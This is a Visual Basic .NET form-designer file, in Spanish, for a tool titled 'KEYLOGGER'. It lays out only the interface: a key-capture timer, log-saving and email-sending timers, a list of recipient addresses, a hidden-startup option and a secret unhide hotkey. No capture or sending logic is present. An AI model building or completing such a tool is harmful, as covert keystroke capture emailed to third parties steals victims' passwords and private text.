<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class frmKL
    Inherits System.Windows.Forms.Form

    'Form reemplaza a Dispose para limpiar la lista de componentes.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Requerido por el Diseñador de Windows Forms
    Private components As System.ComponentModel.IContainer

    'NOTA: el Diseñador de Windows Forms necesita el siguiente procedimiento
    'Se puede modificar usando el Diseñador de Windows Forms.  
    'No lo modifique con el editor de código.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(frmKL))
        Me.tmrKL = New System.Windows.Forms.Timer(Me.components)
        Me.tmrGuardarLog = New System.Windows.Forms.Timer(Me.components)
        Me.tmrEnvioCorreo = New System.Windows.Forms.Timer(Me.components)
        Me.txtCharProhibidos = New System.Windows.Forms.TextBox()
        Me.tbpOpciones = New System.Windows.Forms.TabPage()
        Me.grpTeclasDesocultar = New System.Windows.Forms.GroupBox()
        Me.lblTeclas = New System.Windows.Forms.Label()
        Me.cmbLetra = New System.Windows.Forms.ComboBox()
        Me.chkInicioAutomatico = New System.Windows.Forms.CheckBox()
        Me.grpPassword = New System.Windows.Forms.GroupBox()
        Me.txtPassword = New System.Windows.Forms.TextBox()
        Me.chkArrancarSistema = New System.Windows.Forms.CheckBox()
        Me.grpFrecuenciaLog = New System.Windows.Forms.GroupBox()
        Me.nMinutosLog = New System.Windows.Forms.NumericUpDown()
        Me.lblMinutosLog = New System.Windows.Forms.Label()
        Me.btnGuardar = New System.Windows.Forms.Button()
        Me.grpFrecuenciaEnvios = New System.Windows.Forms.GroupBox()
        Me.nMinutosEnvio = New System.Windows.Forms.NumericUpDown()
        Me.lblMinutosEnvio = New System.Windows.Forms.Label()
        Me.grpCorreos = New System.Windows.Forms.GroupBox()
        Me.txtCorreo = New System.Windows.Forms.TextBox()
        Me.btnAgregar = New System.Windows.Forms.Button()
        Me.btnBorrar = New System.Windows.Forms.Button()
        Me.lbCorreos = New System.Windows.Forms.ListBox()
        Me.btnIniciar = New System.Windows.Forms.Button()
        Me.tbpInicio = New System.Windows.Forms.TabPage()
        Me.txtKL = New System.Windows.Forms.TextBox()
        Me.tbPestañas = New System.Windows.Forms.TabControl()
        Me.ttpMensajes = New System.Windows.Forms.ToolTip(Me.components)
        Me.tbpOpciones.SuspendLayout()
        Me.grpTeclasDesocultar.SuspendLayout()
        Me.grpPassword.SuspendLayout()
        Me.grpFrecuenciaLog.SuspendLayout()
        CType(Me.nMinutosLog, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.grpFrecuenciaEnvios.SuspendLayout()
        CType(Me.nMinutosEnvio, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.grpCorreos.SuspendLayout()
        Me.tbpInicio.SuspendLayout()
        Me.tbPestañas.SuspendLayout()
        Me.SuspendLayout()
        '
        'tmrKL
        '
        Me.tmrKL.Enabled = True
        Me.tmrKL.Interval = 2
        '
        'tmrGuardarLog
        '
        Me.tmrGuardarLog.Enabled = True
        Me.tmrGuardarLog.Interval = 1000
        '
        'tmrEnvioCorreo
        '
        Me.tmrEnvioCorreo.Interval = 1000
        '
        'txtCharProhibidos
        '
        Me.txtCharProhibidos.Location = New System.Drawing.Point(1, 352)
        Me.txtCharProhibidos.Multiline = True
        Me.txtCharProhibidos.Name = "txtCharProhibidos"
        Me.txtCharProhibidos.Size = New System.Drawing.Size(100, 20)
        Me.txtCharProhibidos.TabIndex = 2
        Me.txtCharProhibidos.Text = resources.GetString("txtCharProhibidos.Text")
        Me.txtCharProhibidos.Visible = False
        '
        'tbpOpciones
        '
        Me.tbpOpciones.BackColor = System.Drawing.Color.White
        Me.tbpOpciones.Controls.Add(Me.grpTeclasDesocultar)
        Me.tbpOpciones.Controls.Add(Me.chkInicioAutomatico)
        Me.tbpOpciones.Controls.Add(Me.grpPassword)
        Me.tbpOpciones.Controls.Add(Me.chkArrancarSistema)
        Me.tbpOpciones.Controls.Add(Me.grpFrecuenciaLog)
        Me.tbpOpciones.Controls.Add(Me.btnGuardar)
        Me.tbpOpciones.Controls.Add(Me.grpFrecuenciaEnvios)
        Me.tbpOpciones.Controls.Add(Me.grpCorreos)
        Me.tbpOpciones.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.749999!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.tbpOpciones.ForeColor = System.Drawing.Color.Black
        Me.tbpOpciones.Location = New System.Drawing.Point(4, 22)
        Me.tbpOpciones.Name = "tbpOpciones"
        Me.tbpOpciones.Padding = New System.Windows.Forms.Padding(3)
        Me.tbpOpciones.Size = New System.Drawing.Size(467, 326)
        Me.tbpOpciones.TabIndex = 1
        Me.tbpOpciones.Text = "OPCIONES"
        '
        'grpTeclasDesocultar
        '
        Me.grpTeclasDesocultar.Controls.Add(Me.lblTeclas)
        Me.grpTeclasDesocultar.Controls.Add(Me.cmbLetra)
        Me.grpTeclasDesocultar.Location = New System.Drawing.Point(235, 189)
        Me.grpTeclasDesocultar.Name = "grpTeclasDesocultar"
        Me.grpTeclasDesocultar.Size = New System.Drawing.Size(228, 54)
        Me.grpTeclasDesocultar.TabIndex = 22
        Me.grpTeclasDesocultar.TabStop = False
        Me.grpTeclasDesocultar.Text = "Teclas para desocultar"
        '
        'lblTeclas
        '
        Me.lblTeclas.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblTeclas.Location = New System.Drawing.Point(12, 22)
        Me.lblTeclas.Name = "lblTeclas"
        Me.lblTeclas.Size = New System.Drawing.Size(129, 18)
        Me.lblTeclas.TabIndex = 23
        Me.lblTeclas.Text = "CTRL+SHIFT+ALT+"
        '
        'cmbLetra
        '
        Me.cmbLetra.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.cmbLetra.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.749999!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.cmbLetra.FormattingEnabled = True
        Me.cmbLetra.Items.AddRange(New Object() {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V ", "W", "X", "Y", "Z"})
        Me.cmbLetra.Location = New System.Drawing.Point(147, 19)
        Me.cmbLetra.Name = "cmbLetra"
        Me.cmbLetra.Size = New System.Drawing.Size(75, 24)
        Me.cmbLetra.TabIndex = 22
        '
        'chkInicioAutomatico
        '
        Me.chkInicioAutomatico.AutoSize = True
        Me.chkInicioAutomatico.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.chkInicioAutomatico.Location = New System.Drawing.Point(247, 118)
        Me.chkInicioAutomatico.Name = "chkInicioAutomatico"
        Me.chkInicioAutomatico.Size = New System.Drawing.Size(168, 20)
        Me.chkInicioAutomatico.TabIndex = 22
        Me.chkInicioAutomatico.Text = "Iniciar automáticamente"
        Me.ttpMensajes.SetToolTip(Me.chkInicioAutomatico, "Envíos a los correos y guardar archivos en la carpeta LOG")
        Me.chkInicioAutomatico.UseVisualStyleBackColor = True
        '
        'grpPassword
        '
        Me.grpPassword.Controls.Add(Me.txtPassword)
        Me.grpPassword.Location = New System.Drawing.Point(235, 144)
        Me.grpPassword.Name = "grpPassword"
        Me.grpPassword.Size = New System.Drawing.Size(226, 43)
        Me.grpPassword.TabIndex = 24
        Me.grpPassword.TabStop = False
        Me.grpPassword.Text = "Definir password"
        '
        'txtPassword
        '
        Me.txtPassword.Font = New System.Drawing.Font("Arial", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtPassword.Location = New System.Drawing.Point(6, 17)
        Me.txtPassword.MaxLength = 10
        Me.txtPassword.Name = "txtPassword"
        Me.txtPassword.PasswordChar = Global.Microsoft.VisualBasic.ChrW(8226)
        Me.txtPassword.Size = New System.Drawing.Size(216, 22)
        Me.txtPassword.TabIndex = 0
        Me.ttpMensajes.SetToolTip(Me.txtPassword, "Máximo 10 caraceres")
        '
        'chkArrancarSistema
        '
        Me.chkArrancarSistema.AutoSize = True
        Me.chkArrancarSistema.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.chkArrancarSistema.Location = New System.Drawing.Point(247, 243)
        Me.chkArrancarSistema.Name = "chkArrancarSistema"
        Me.chkArrancarSistema.Size = New System.Drawing.Size(214, 20)
        Me.chkArrancarSistema.TabIndex = 23
        Me.chkArrancarSistema.Text = "Arrancar con el sistema (oculto)"
        Me.ttpMensajes.SetToolTip(Me.chkArrancarSistema, "Iniciar con windows")
        Me.chkArrancarSistema.UseVisualStyleBackColor = True
        '
        'grpFrecuenciaLog
        '
        Me.grpFrecuenciaLog.Controls.Add(Me.nMinutosLog)
        Me.grpFrecuenciaLog.Controls.Add(Me.lblMinutosLog)
        Me.grpFrecuenciaLog.Location = New System.Drawing.Point(235, 61)
        Me.grpFrecuenciaLog.Name = "grpFrecuenciaLog"
        Me.grpFrecuenciaLog.Size = New System.Drawing.Size(225, 51)
        Me.grpFrecuenciaLog.TabIndex = 21
        Me.grpFrecuenciaLog.TabStop = False
        Me.grpFrecuenciaLog.Text = "Frecuencia de Log's"
        '
        'nMinutosLog
        '
        Me.nMinutosLog.Location = New System.Drawing.Point(6, 22)
        Me.nMinutosLog.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.nMinutosLog.Name = "nMinutosLog"
        Me.nMinutosLog.Size = New System.Drawing.Size(135, 22)
        Me.nMinutosLog.TabIndex = 20
        Me.nMinutosLog.Value = New Decimal(New Integer() {1, 0, 0, 0})
        '
        'lblMinutosLog
        '
        Me.lblMinutosLog.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.749999!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblMinutosLog.Location = New System.Drawing.Point(147, 24)
        Me.lblMinutosLog.Name = "lblMinutosLog"
        Me.lblMinutosLog.Size = New System.Drawing.Size(72, 20)
        Me.lblMinutosLog.TabIndex = 20
        Me.lblMinutosLog.Text = "(Minutos)"
        '
        'btnGuardar
        '
        Me.btnGuardar.BackColor = System.Drawing.Color.SeaGreen
        Me.btnGuardar.Font = New System.Drawing.Font("Showcard Gothic", 15.75!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnGuardar.ForeColor = System.Drawing.Color.White
        Me.btnGuardar.Location = New System.Drawing.Point(235, 269)
        Me.btnGuardar.Name = "btnGuardar"
        Me.btnGuardar.Size = New System.Drawing.Size(228, 45)
        Me.btnGuardar.TabIndex = 15
        Me.btnGuardar.Text = "GUARDAR"
        Me.btnGuardar.UseVisualStyleBackColor = False
        '
        'grpFrecuenciaEnvios
        '
        Me.grpFrecuenciaEnvios.Controls.Add(Me.nMinutosEnvio)
        Me.grpFrecuenciaEnvios.Controls.Add(Me.lblMinutosEnvio)
        Me.grpFrecuenciaEnvios.Location = New System.Drawing.Point(235, 6)
        Me.grpFrecuenciaEnvios.Name = "grpFrecuenciaEnvios"
        Me.grpFrecuenciaEnvios.Size = New System.Drawing.Size(225, 49)
        Me.grpFrecuenciaEnvios.TabIndex = 19
        Me.grpFrecuenciaEnvios.TabStop = False
        Me.grpFrecuenciaEnvios.Text = "Frecuencia de envío"
        '
        'nMinutosEnvio
        '
        Me.nMinutosEnvio.Location = New System.Drawing.Point(6, 22)
        Me.nMinutosEnvio.Minimum = New Decimal(New Integer() {1, 0, 0, 0})
        Me.nMinutosEnvio.Name = "nMinutosEnvio"
        Me.nMinutosEnvio.Size = New System.Drawing.Size(135, 22)
        Me.nMinutosEnvio.TabIndex = 20
        Me.nMinutosEnvio.Value = New Decimal(New Integer() {1, 0, 0, 0})
        '
        'lblMinutosEnvio
        '
        Me.lblMinutosEnvio.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.749999!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblMinutosEnvio.Location = New System.Drawing.Point(147, 24)
        Me.lblMinutosEnvio.Name = "lblMinutosEnvio"
        Me.lblMinutosEnvio.Size = New System.Drawing.Size(72, 20)
        Me.lblMinutosEnvio.TabIndex = 20
        Me.lblMinutosEnvio.Text = "(Minutos)"
        '
        'grpCorreos
        '
        Me.grpCorreos.Controls.Add(Me.txtCorreo)
        Me.grpCorreos.Controls.Add(Me.btnAgregar)
        Me.grpCorreos.Controls.Add(Me.btnBorrar)
        Me.grpCorreos.Controls.Add(Me.lbCorreos)
        Me.grpCorreos.Controls.Add(Me.btnIniciar)
        Me.grpCorreos.Location = New System.Drawing.Point(7, 6)
        Me.grpCorreos.Name = "grpCorreos"
        Me.grpCorreos.Size = New System.Drawing.Size(225, 316)
        Me.grpCorreos.TabIndex = 15
        Me.grpCorreos.TabStop = False
        Me.grpCorreos.Text = "Lista de correos receptores"
        '
        'txtCorreo
        '
        Me.txtCorreo.Location = New System.Drawing.Point(6, 199)
        Me.txtCorreo.Name = "txtCorreo"
        Me.txtCorreo.Size = New System.Drawing.Size(213, 22)
        Me.txtCorreo.TabIndex = 14
        '
        'btnAgregar
        '
        Me.btnAgregar.BackColor = System.Drawing.Color.SeaGreen
        Me.btnAgregar.Font = New System.Drawing.Font("Showcard Gothic", 11.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnAgregar.ForeColor = System.Drawing.Color.White
        Me.btnAgregar.Location = New System.Drawing.Point(6, 221)
        Me.btnAgregar.Name = "btnAgregar"
        Me.btnAgregar.Size = New System.Drawing.Size(116, 36)
        Me.btnAgregar.TabIndex = 13
        Me.btnAgregar.Text = "Agregar"
        Me.ttpMensajes.SetToolTip(Me.btnAgregar, "Añadir el correo de la caja de texto")
        Me.btnAgregar.UseVisualStyleBackColor = False
        '
        'btnBorrar
        '
        Me.btnBorrar.BackColor = System.Drawing.Color.Crimson
        Me.btnBorrar.Font = New System.Drawing.Font("Showcard Gothic", 11.25!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnBorrar.ForeColor = System.Drawing.Color.White
        Me.btnBorrar.Location = New System.Drawing.Point(128, 221)
        Me.btnBorrar.Name = "btnBorrar"
        Me.btnBorrar.Size = New System.Drawing.Size(91, 36)
        Me.btnBorrar.TabIndex = 14
        Me.btnBorrar.Text = "Borrar"
        Me.ttpMensajes.SetToolTip(Me.btnBorrar, "Borrar el correo seleccionado")
        Me.btnBorrar.UseVisualStyleBackColor = False
        '
        'lbCorreos
        '
        Me.lbCorreos.FormattingEnabled = True
        Me.lbCorreos.ItemHeight = 16
        Me.lbCorreos.Location = New System.Drawing.Point(6, 21)
        Me.lbCorreos.Name = "lbCorreos"
        Me.lbCorreos.Size = New System.Drawing.Size(213, 164)
        Me.lbCorreos.TabIndex = 13
        '
        'btnIniciar
        '
        Me.btnIniciar.BackColor = System.Drawing.Color.RoyalBlue
        Me.btnIniciar.Font = New System.Drawing.Font("Showcard Gothic", 24.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnIniciar.ForeColor = System.Drawing.Color.White
        Me.btnIniciar.Location = New System.Drawing.Point(6, 263)
        Me.btnIniciar.Name = "btnIniciar"
        Me.btnIniciar.Size = New System.Drawing.Size(213, 45)
        Me.btnIniciar.TabIndex = 8
        Me.btnIniciar.Text = "INICIAR"
        Me.ttpMensajes.SetToolTip(Me.btnIniciar, "Iniciar envíos y guardados")
        Me.btnIniciar.UseVisualStyleBackColor = False
        '
        'tbpInicio
        '
        Me.tbpInicio.BackColor = System.Drawing.Color.White
        Me.tbpInicio.Controls.Add(Me.txtKL)
        Me.tbpInicio.Font = New System.Drawing.Font("Stencil", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.tbpInicio.ForeColor = System.Drawing.Color.Black
        Me.tbpInicio.Location = New System.Drawing.Point(4, 22)
        Me.tbpInicio.Name = "tbpInicio"
        Me.tbpInicio.Padding = New System.Windows.Forms.Padding(3)
        Me.tbpInicio.Size = New System.Drawing.Size(467, 326)
        Me.tbpInicio.TabIndex = 0
        Me.tbpInicio.Text = "INICIO"
        '
        'txtKL
        '
        Me.txtKL.Font = New System.Drawing.Font("Arial", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.txtKL.Location = New System.Drawing.Point(3, 3)
        Me.txtKL.Multiline = True
        Me.txtKL.Name = "txtKL"
        Me.txtKL.ScrollBars = System.Windows.Forms.ScrollBars.Vertical
        Me.txtKL.Size = New System.Drawing.Size(463, 362)
        Me.txtKL.TabIndex = 1
        '
        'tbPestañas
        '
        Me.tbPestañas.Controls.Add(Me.tbpInicio)
        Me.tbPestañas.Controls.Add(Me.tbpOpciones)
        Me.tbPestañas.Location = New System.Drawing.Point(1, -2)
        Me.tbPestañas.Name = "tbPestañas"
        Me.tbPestañas.SelectedIndex = 0
        Me.tbPestañas.Size = New System.Drawing.Size(475, 352)
        Me.tbPestañas.TabIndex = 0
        Me.tbPestañas.Tag = ""
        '
        'frmKL
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.SystemColors.Window
        Me.ClientSize = New System.Drawing.Size(473, 350)
        Me.Controls.Add(Me.txtCharProhibidos)
        Me.Controls.Add(Me.tbPestañas)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "frmKL"
        Me.ShowIcon = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "KEYLOGGER"
        Me.tbpOpciones.ResumeLayout(False)
        Me.tbpOpciones.PerformLayout()
        Me.grpTeclasDesocultar.ResumeLayout(False)
        Me.grpPassword.ResumeLayout(False)
        Me.grpPassword.PerformLayout()
        Me.grpFrecuenciaLog.ResumeLayout(False)
        CType(Me.nMinutosLog, System.ComponentModel.ISupportInitialize).EndInit()
        Me.grpFrecuenciaEnvios.ResumeLayout(False)
        CType(Me.nMinutosEnvio, System.ComponentModel.ISupportInitialize).EndInit()
        Me.grpCorreos.ResumeLayout(False)
        Me.grpCorreos.PerformLayout()
        Me.tbpInicio.ResumeLayout(False)
        Me.tbpInicio.PerformLayout()
        Me.tbPestañas.ResumeLayout(False)
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents tmrKL As System.Windows.Forms.Timer
    Friend WithEvents tmrGuardarLog As System.Windows.Forms.Timer
    Friend WithEvents tmrEnvioCorreo As System.Windows.Forms.Timer
    Friend WithEvents txtCharProhibidos As System.Windows.Forms.TextBox
    Friend WithEvents tbpOpciones As System.Windows.Forms.TabPage
    Friend WithEvents grpTeclasDesocultar As System.Windows.Forms.GroupBox
    Friend WithEvents lblTeclas As System.Windows.Forms.Label
    Friend WithEvents cmbLetra As System.Windows.Forms.ComboBox
    Friend WithEvents btnGuardar As System.Windows.Forms.Button
    Friend WithEvents grpFrecuenciaLog As System.Windows.Forms.GroupBox
    Friend WithEvents chkInicioAutomatico As System.Windows.Forms.CheckBox
    Friend WithEvents nMinutosLog As System.Windows.Forms.NumericUpDown
    Friend WithEvents lblMinutosLog As System.Windows.Forms.Label
    Friend WithEvents grpFrecuenciaEnvios As System.Windows.Forms.GroupBox
    Friend WithEvents nMinutosEnvio As System.Windows.Forms.NumericUpDown
    Friend WithEvents lblMinutosEnvio As System.Windows.Forms.Label
    Friend WithEvents grpCorreos As System.Windows.Forms.GroupBox
    Friend WithEvents txtCorreo As System.Windows.Forms.TextBox
    Friend WithEvents btnAgregar As System.Windows.Forms.Button
    Friend WithEvents btnBorrar As System.Windows.Forms.Button
    Friend WithEvents lbCorreos As System.Windows.Forms.ListBox
    Friend WithEvents btnIniciar As System.Windows.Forms.Button
    Friend WithEvents tbpInicio As System.Windows.Forms.TabPage
    Friend WithEvents txtKL As System.Windows.Forms.TextBox
    Friend WithEvents tbPestañas As System.Windows.Forms.TabControl
    Friend WithEvents chkArrancarSistema As System.Windows.Forms.CheckBox
    Friend WithEvents grpPassword As System.Windows.Forms.GroupBox
    Friend WithEvents txtPassword As System.Windows.Forms.TextBox
    Friend WithEvents ttpMensajes As System.Windows.Forms.ToolTip

End Class
